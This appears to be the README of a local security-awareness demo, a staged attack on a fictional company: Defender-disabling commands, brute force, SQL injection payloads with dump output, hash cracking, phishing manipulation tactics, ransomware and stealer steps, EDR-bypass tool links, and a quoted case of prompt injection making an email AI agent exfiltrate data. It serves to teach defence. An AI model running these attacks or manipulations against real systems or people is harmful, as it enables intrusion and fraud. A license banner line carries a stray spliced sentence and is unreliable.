# CyberAttackSimulation

## Install

### Required

1. Python3
2. Keepass

```bash
wget https://raw.githubusercontent.com/tarraschk/richelieu/refs/heads/master/french_passwords_top5000.txt -O french_passwords.txt
```

### Optional

```bash
python3 -m pip install TotpApp
python3 -m pip install Cr0wl3r
```

## Configure

### DNS (administrator permissions required)

In the *host* file (`/etc/hosts`, `C:\Windows\System32\drivers\etc\hosts`):

```
127.0.0.1 sylphora-dynamics.test
127.0.0.1 talks.local
127.0.0.1 mailbox.fr
127.0.0.1 a.c2
127.0.0.1 attackers.c2
127.0.0.1 pixeltracking.attackers.c2
127.0.0.1 csv.attackers.c2
127.0.0.1 breach.onion
127.0.0.1 data.breach.onion
```

### Defender (administrator permissions required)

> This step is not required when I write the presentation, but it should be detected by EPP in the future. You need to disable it to ensure that your demonstration works.
>> The PowerShell command using `iex(iwr ...)` is now detected as a **ClickFix attack** when performing the BadUSB attack. You can fix this by disabling *real time protection* oor by modifying the payload (starting `ransom.ps1` directly from PowerShell is not detected).

```powershell
Set-ExecutionPolicy RemoteSigned
Set-MpPreference -DisableRealtimeMonitoring $true
```

If don't have permissions to disable the *Tamper Protection* with administrator permissions, you may disable it from graphical interface:

1. Open the *Windows Security* app by clicking on the Start menu and typing *Windows Security*. Select *Windows Security* to open it.
2. In the *Windows Security* app, click on the *Virus & threat protection* tab.
3. Under the *Virus & threat protection settings*, click on *Manage settings*.
4. Scroll down to the *Tamper Protection* section and toggle the switch to enable it.
5. Turn off *Real-time protection*.

### Browser

In your browser: accept to open popup from `mailbox.fr` (firefox: `about:preferences#privacy` -> `Permissions` -> `popups` -> `Exceptions` -> `http://mailbox.fr:8080^firstPartyDomain=mailbox.fr`).

In firefox: `about:config` -> `network.dns.blockDotOnion` -> `false`

### Initialize

```batch
python3 website/bdd.py
python3 arsenal\malicious_lnk.py
powershell -ExecutionPolicy Bypass arsenal\USB\hook_iwr.ps1
```

```powershell
Set-ItemProperty -Path HKCU:\Console -Name VirtualTerminalLevel -Value 1 -Type DWord
```

## Introduction

 - *I found a USB drive. Did anyone lose it ?*
 - *No ? Okay, I will check the documents on it to identify the owner.*
 - **Ransomware deployed and running**

## Start the scenario

```bash
run.bat
```

## Scenario

1. We are hackers, we have contacted an employee on telegram to ask informations about *Sylphora Dynamics*.
2. *Sylphora Dynamics* is a little company and we are obtaining information about the bank accounts and finances: they are all managed through the boss's email account.
3. The strategy is: make discreet bank transfers by compromising the boss's email account.
4. To do this, we need access to the boss's email account (the boss is the CEO and founder of the company).

## Step 1: web site analysis

1. Open web browser on the [company website](http://sylphora-dynamics.test:8080/welcome.html) and navigate on the website to get information about the company
2. Run `Cr0wl3r --do-not-download --recursive http://sylphora-dynamics.test:8080/welcome.html`
3. Analysis:
    - the only one and most dynamic page: `/login.html` (`python3 arsenal/dynamics_printer.py`)
    - 2 emails addresses: `bertille.demoulin@sylphora-dynamics.test` (RH) and `henri.brosquet@sylphora-dynamics.test` (CEO)

```

TerminalMessages  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


Cr0wl3r  Copyright (C) 2023, 2024, 2025  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you confirm requests through a different communication channel (phone, instant message, etc.) and never respond to or use the contact information provided in the suspicious email.are welcome to redistribute it
under certain conditions.

[+] [a<href>] http://sylphora-dynamics.test:8080/careers.html
[#] [a<href>] http://sylphora-dynamics.test:8080/assets/sylphora-tech-report.pdf
[+] [a<href>] http://sylphora-dynamics.test:8080/login.html
[+] [a<href>] http://sylphora-dynamics.test:8080/contact.html
[2025-08-11 16:49:07] WARNING (30): HTTP 404 error in http://sylphora-dynamics.test:8080/robots.txt
[2025-08-11 16:49:07] WARNING (30): HTTP 404 error in http://sylphora-dynamics.test:8080/sitemap.xml
[2025-08-11 16:49:07] WARNING (30): HTTP 404 error in http://sylphora-dynamics.test:8080/crossdomain.xml
[#] [a<href>] http://sylphora-dynamics.test:8080/assets/cv_mathilde_rousseau.pdf
[#] [a<href>] http://sylphora-dynamics.test:8080/assets/cv_lucas_fayet.pdf
[+] [form<action>] http://sylphora-dynamics.test:8080/login
[2025-08-11 16:49:07] WARNING (30): HTTP 404 error in http://sylphora-dynamics.test:8080/login
[2025-08-11 16:49:07] WARNING (30): An error occurs on the request, URL is probably wrong: http://sylphora-dynamics.test:8080/login
```

## Step 2: Bruteforce

1. Download a french password wordlist: `wget https://raw.githubusercontent.com/tarraschk/richelieu/refs/heads/master/french_passwords_top5000.txt -O french_passwords.txt`
2. Run the bruteforce script: `python3 arsenal/bruteforce.py`
3. Credentials found for `bertille.demoulin@sylphora-dynamics.test`
4. OPTIONAL: we can try an authentication with the valid credentials, we get a new prompt for a 2FA

```
Credentials found: bertille.demoulin@sylphora-dynamics.test marseille
10002 credentials tried
```

## Step 3: Injection

1. On the login page, test payload ``'"`{{7*7}}<test&>|;``
2. We get an error 500 page with explanation:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 500</p>
        <p>Message: Internal Server Error.</p>
        <p>Error code explanation: 500 - OperationalError: unrecognized token: "`{{7*7}}&lt;test&amp;&gt;|;" AND password_hash = "8ec43158ceacd4c9d41d45e1362310d6893d913549be52283211a0d0dfb81f03";".</p>
    </body>
</html>
```

3. Check on google: `error OperationalError: unrecognized token: "` -> SQLite3 error
4. Good we have a blind SQL injection !
5. First authentication: `" OR 1=1; --`.

## Step 4: Exploit

1. Develop your personal tool or use SQLmap
2. Run `python3 arsenal/exploit.py`:

```
Start: table count
End: 1. table count 3
Start: table name
Start: string length
End: 2. string length 5
End: 2. table name 33
Get columns for 'users' [Y/N/YES/NO]: Y
Start: columns name
Start: string length
End: 4. string length 9
End: 4. columns name 1067
Dumps 'users' [Y/N/YES/NO]: Y
Start: line count (users)
Line number: 5
End: 6. line count (users) 11
Get integer values for column 'users'.'id' [Y/N/YES/NO]: N
Get string values for column 'users'.'username' [Y/N/YES/NO]: y
Start: get string values 'users'.'username'
Start: string length
End: 7. string length 8
Find value in 'users'.'username' (0): 'bertille.demoulin@sylphora-dynamics.test'
Start: string length
End: 9. string length 7
Find value in 'users'.'username' (1): 'george.fayet@sylphora-dynamics.test'
Start: string length
End: 10. string length 8
Find value in 'users'.'username' (2): 'henri.brosquet@sylphora-dynamics.test'
Start: string length
End: 11. string length 8
Find value in 'users'.'username' (3): 'mathilde.rousseau@sylphora-dynamics.test'
Start: string length
End: 12. string length 7
Find value in 'users'.'username' (4): 'nora.blin@sylphora-dynamics.test'
End: 7. get string values 'users'.'username' 1209
Get string values for column 'users'.'password_hash' [Y/N/YES/NO]: y
Start: get string values 'users'.'password_hash'
Start: string length
End: 13. string length 8
Find value in 'users'.'password_hash' (0): 'a2cccab5194ef77c7aa034a11360d58fa2121de11ebd94a879b21c1ce2a70d9b'
Start: string length
End: 15. string length 8
Find value in 'users'.'password_hash' (1): '4adff94eb3d10bb346911003109ff519afaca197efb481b9ab7505be779029b2'
Start: string length
End: 16. string length 8
Find value in 'users'.'password_hash' (2): '82f37b46f7c1f6828ddb67aede9811d9ba0940db9ffd6fdb1d9b2488a7c4090b'
Start: string length
End: 17. string length 8
Find value in 'users'.'password_hash' (3): 'a253b1985e9a89f7c3fd9777c5d7f4059c0b7bc169c2b65ba328c784f62bc28a'
Start: string length
End: 18. string length 8
Find value in 'users'.'password_hash' (4): 'f7d75f74719a2b1d1466d950d0ed197966b55290e619dc921df25d6429e98ef6'
End: 13. get string values 'users'.'password_hash' 2126
Get string values for column 'users'.'token2fa' [Y/N/YES/NO]: y
Start: get string values 'users'.'token2fa'
Start: string length
End: 19. string length 8
Find value in 'users'.'token2fa' (0): '3IWXUL3RR7IFGUNA'
Start: string length
End: 21. string length 8
Find value in 'users'.'token2fa' (1): 'LWMCWSJLICFYJ4UG'
Start: string length
End: 22. string length 8
Find value in 'users'.'token2fa' (2): 'QSK2K3STSGWKGF6E'
Start: string length
End: 23. string length 8
Find value in 'users'.'token2fa' (3): 'EJ4WBDFGIV6DDEDV'
Start: string length
End: 24. string length 8
Find value in 'users'.'token2fa' (4): 'LIRHREPOSRV7CINI'
End: 19. get string values 'users'.'token2fa' 528
Start: table name
Start: string length
End: 25. string length 5
End: 25. table name 103
Get columns for 'sqlite_sequence' [Y/N/YES/NO]: n
Request count: 5217
```

3. Good ! We have usernames, we have hashed passwords and we have 2FA secrets !
4. We can perform a complete authentication with `bertille.demoulin@sylphora-dynamics.test`

## Step 5: guess credentials

1. Develop a custom tool to generate personal wordlist or find a tool on internet
2. Check hash algorithm with bertille credentials -> sha256
2. Generate custom wordlist for `george.fayet@sylphora-dynamics.test`, `henri.brosquet@sylphora-dynamics.test`, `mathilde.rousseau@sylphora-dynamics.test` and compare with hash
3. We got george password

```
~$ python3 arsenal/password_generator.py 
Prénoms (séparer par des virgules, laisser vide si aucun): george
Noms de famille (séparer par des virgules, laisser vide si aucun): fayet
Noms d'animaux (séparer par des virgules, laisser vide si aucun): 
Surnoms / pseudos (séparer par des virgules, laisser vide si aucun): 
Autres mots (lieux, équipes, hobbies) (séparer par des virgules, laisser vide si aucun): marseille
Date de naissance (JJ/MM/AAAA), année (AAAA) ou années si estimées (AAAA-AAAA), laisser vide si non: 1955-1965
Nombres porte-bonheur (ex: 7, 13, 1984) (séparer par des virgules, laisser vide si aucun): 
Tag lié au service (ex: gmail, amazon) — optionnel: sylphora-dynamics

Génération en cours...
Password found: $08g3f@1956
36108220 candidats générés en 101.13 seconde.

Afficher les résultats dans la console ? (o/N): 

Enregistrer les résultats dans un fichier ? (o/N): 
~$
```

## Step6: leaks

1. Checks for data leak on [data.breach.onion](http://data.breach.onion:8080/search.html) and password reuse for `henri.brosquet@sylphora-dynamics.test` and `mathilde.rousseau@sylphora-dynamics.test`.
2. We got the `gmail` password for `mathilde.rousseau@gmail.com`: `V3RyStr0ngP4$$w0rdF0rGmail`
3. Guess the password for `mathilde.rousseau@sylphora-dynamics.test`: `V3RyStr0ngP4$$w0rdF0rSylphora`

## Step 7: phishing with password stealer

1. We want `henri.brosquet@sylphora-dynamics.test` credentials so we can target *Henri Brosquet*
2. Send a phishing email with a malicious URL, read mail on [mailbox.fr](http://mailbox.fr:8080/mailbox.html)
3. Fake PDF deploy a malware on Windows
4. Steal keepass credentials

## Step 8: authentication

1. Login using henri credentials
2. Use the 2FA secret to perform complete authentication

## Protections

### Personal

1. Always lock your workstation with a password when you step away, it doesn't protect the computer's data, but it makes it harder for attackers to exploit open sessions like a logged-in email in a private browser window.
2. Use a password manager with a strong and unique password for each account.
3. Do not use public networks or work in public places with confidential data (like in trains).
4. Keep your systems and applications up to date:
    - Always apply system and software updates as soon as possible.
    - If regular updates take too much time, prioritize web browsers and email clients, as they are the most exposed to online threats.
5. Use multiple email accounts:
    - One secure account for sensitive sites (e.g., banking).
    - One for general use.
    - One for professional purposes. Avoid using your professional email for personal usages (like french governement with MYM)
6. Do not use AI tools with confidential or sensitive data to avoid accidental leaks.
7. Limit installed applications and extensions:
    - Minimize the number of apps and (browser) modules/extensions installed on your devices.
    - Prefer using a web version of a service rather than installing its app, whenever possible. (open links with your password manager, not from search engines and not from an email)
    - Do not install personal apps on your professional phone.
    - Avoid unnecessary or high-risk apps (e.g., messaging apps like WhatsApp, which was exploited in the past by spyware such as Pegasus).
8. Be cautious with emails:
    - Do not open emails without checking the sender's identity (**check the domain first**).
    - Do not click on any link contained in an email.
    - Do not perform any action requested in the email.
    - Do not open attachments downloaded from emails unless you are absolutely sure of their legitimacy.
9. Do not follow through with the actions requested in the email:
    - Exercise caution when handling sensitive (confidential, personal) information.
    - Exercise caution with any financial transactions or requests.
    
#### Tips

 - Automatically clear cookies and site data when closing your browser to protect your privacy and reduce tracking.
 - Use private browsing mode for general or everyday usage.
 - Confirm requests through a different communication channel (phone, instant message, etc.) and never respond to or use the contact information provided in the suspicious email.

### Professionnal

1. Use EDR / EPP / Antivirus solutions, but remember, these are not magic tools ! They complement, not replace, good security practices.
2. Avoid generating code with AI unless you have strong expertise in code review and secure development practices, as AI-generated code may contain security vulnerabilities.
3. Enforce two-factor authentication (2FA) for employees with lower cybersecurity awareness, such as HR, accounting, and sales staff. Note that 2FA does not fully protect against technical attacks or phishing; it mainly forces attackers to automate their access attempts or to obtain additional secrets through the exploitation of vulnerabilities. Sometimes, it is only a small hurdle: a study showed that Microsoft's 2FA could be guessed within 70 minutes with a probability of one in two.
4. As soon as possible, build a DevSecOps team to be involved early in the information system security process. Early integration of DevSecOps helps detect and fix security issues from the start, not after deployment.
5. Enable full disk encryption on your devices to protect sensitive data in case of loss or theft.

#### Tips

 - Use Single Sign-On (SSO) to limit the number of passwords employees need to remember.
 - Limit mandatory password changes, but enforce strong password policies to maintain security.
 - Create an email rule to move all messages from your internal domain to a specific folder, so spoofed emails from look-alike domains are easier to spot.

## Bonus

### Deep dive into email attack

#### Techniques

 - TypoSquatting
     - `google.com` -> `goggle.com`
 - Punycode
     - `paypal.com` -> `раураl.com`
 - Pixel Tracking
 - ClickFix
 - CEO fraud (mail, phone call, SMS, DeepFake)

#### Maldoc

 - [MaliciousPDF](https://github.com/mauricelambert/MaliciousPDF)
 - XLL/WLL

#### Malicious execution

 - Download from URL

#### Technical attacks

##### Vulnerability (in the mailbox)

 - 0 click
     - [ShadowLeak radware](https://www.radware.com/security/threat-advisories-and-attack-reports/shadowleak/)
         > An attack takes advantage of the vulnerability by sending a legitimate‑looking email that quietly embeds malicious instructions in invisible or non‑obvious HTML. When an employee asks the assistant to “summarize today's emails” or “research my inbox about a topic,” the agent ingests the booby‑trapped message and, without further user interaction, exfiltrates sensitive data by calling an attacker‑controlled URL with private parameters
     - [CVE‑2025‑32711](https://www.aim.security/lp/aim-labs-echoleak-m365), [NVD nist](https://nvd.nist.gov/vuln/detail/cve-2025-32711)
     - [Alert CVE-2023-37580 - CERT-FR](https://www.cert.ssi.gouv.fr/alerte/CERTFR-2023-ALE-007/)
     - [Alert CVE-2023-23397 - CERT-FR](https://www.cert.ssi.gouv.fr/alerte/CERTFR-2023-ALE-002/)
     - [Known Exploited Vulnerabilities Catalog CVE-2021-30860 - CISA](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-30860), [wikipedia FORCEDENTRY](https://en.wikipedia.org/wiki/FORCEDENTRY)
     - [Mail.ee vulnerability](https://www.cybersecurity-help.cz/blog/1165.html)
         > The attack involved emails containing a malicious code sent to Mail.ee recipients. Once the email was opened using the Mail.ee portal, the malicious code was executed. It then would enable and set up email forwarding so that all of the emails sent to the target were redirected to an email account controlled by the hackers. 

#### Social Engineering

##### Email 1

1. Firstname usage
2. First question: "How are you ?"
    - Social Conformity -> "I'm fine, thank you. And you ?"
        - Yes-Ladder
    - Reciprocity Bias
3. "I wished to inform you ...", "... so you can dispose of it quickly"
    - Reciprocity Bias
4. "Could you check that..."
    - Foot-in-the-Door
5. "being a person with a disability"
    - pathos manipulation (compassion bias)
6. "The postman recommended to me...", "... secure service from La Poste"
    - authority bias
7. "Because" usage
8. "I took the initiative to... for you"
    - Reciprocity Bias
9. "important ... official ... as soon as possible"
    - scarcity bias (urgency due to scarcity)
10. "so that you can"
    - you are free to
    - priming with freedom
11. Download document
    - Bypass phishing protection
    - Foot-in-the-Door
    - priming
12. Decompress zip archive
    - Foot-in-the-Door
    - priming
13. Click on the document -> deploy invisible malware

##### Email 2

1. Firstname usage
2. "I've heard a lot of good things about you... you are very professional.", "Iâ€™m counting on you to..."
    - labeling
3. "I've heard a lot of good things about you."
    - social pressure
4. "without this, your computer is vulnerable; it could be hacked. Don't worry... your computer will be perfectly secured."
    - fear-then-relief
5. "Thank you very much for your help and your responsiveness !"
    - Reciprocity Bias

### Are USB Drives Really Dangerous ?

 - Rubber ducky
 - Malicious documents

### Deep dive into credentials stealers

#### Local storages

 - [LaZagne](https://github.com/AlessandroZ/LaZagne)
 - [ChromePasswordsStealer](https://github.com/mauricelambert/ChromePasswordsStealer)
 - [mRemoteNGpasswordsStealer](https://github.com/mauricelambert/mRemoteNGpasswordsStealer)

#### Web browser extension

 - [SpywareStealer](https://github.com/mauricelambert/SpywareStealer)

#### Keylogger

 - [NimKeylogger](https://github.com/mauricelambert/NimKeylogger)
 - [SpyWare](https://github.com/mauricelambert/SpyWare)

#### Bonus in the bonus: Endpoint protection bypass

 - [BypassHash](https://github.com/mauricelambert/BypassHash)
 - [PyPeUrlLoader](https://github.com/mauricelambert/PyPeUrlLoader), [PyPeLoader](https://github.com/mauricelambert/PyPeLoader)
 - [PyPePacker](https://github.com/mauricelambert/PyPePacker), [PyPeLoader](https://github.com/mauricelambert/PyPeLoader)

